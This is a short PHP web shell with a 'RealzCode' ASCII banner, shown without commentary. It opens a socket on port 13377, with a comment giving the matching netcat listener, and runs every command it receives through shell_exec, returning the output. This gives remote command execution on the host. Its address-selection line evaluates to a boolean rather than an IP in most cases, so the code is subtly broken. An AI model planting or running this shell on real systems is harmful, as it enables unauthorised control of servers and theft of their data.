<?php
$we="  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
";
$po=13377; // nc -l -p 13377
set_time_limit($po);
$ip=$_SERVER['SERVER_ADDR']!=='::1'?:'127.0.0.1';
$sock=@fsockopen($ip,$po,$errno,$errstr);
if($errno!=0){echo"$errno:$errstr";
}elseif(!$sock){exit;}else{
echo"$ip:$po";
fputs($sock,"$we\n");
while(!feof($sock)){
fputs($sock,"$ ");
$cmd=fgets($sock,$po);
if(!empty($cmd))fputs($sock,@shell_exec($cmd));}
fclose($sock);
}
